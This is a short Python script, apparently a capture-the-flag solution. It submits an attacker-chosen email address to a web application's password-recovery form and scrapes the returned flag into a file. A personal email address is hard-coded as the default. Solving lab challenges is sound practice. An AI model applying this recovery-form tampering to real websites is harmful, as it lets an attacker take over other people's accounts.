import requests
import json
from bs4 import BeautifulSoup
import sys


def get_flag(host_name, email):
    flag = None

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64…) Gecko/20100101 Firefox/67.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {'mail': email, 'Submit': 'Submit'}

    session = requests.Session()
    session.get('http://{host}/'.format(host=host_name), data=json.dumps(headers))
    response = session.post('http://{host}/?page=recover'.format(host=host_name), data=data)

    if response.status_code == 200:
        with open('../flag', 'w') as f:
            flag = BeautifulSoup(response.text, 'html.parser').find('h2').text.split(':')[-1].strip()
            f.write(flag)
    return flag


def check_host_name(host_name):
    return requests.get('http://'+host_name).status_code == 200


if __name__ == '__main__':
    try:
        host_name = sys.argv[1]
        email = sys.argv[2] if len(sys.argv) == 3 else 'romangadyatskiy@gmail.com'

        if check_host_name(host_name):
            print(get_flag(host_name, email))
        else:
            raise Exception('Incorrect host name')
    except Exception as e:
        print(e.args)
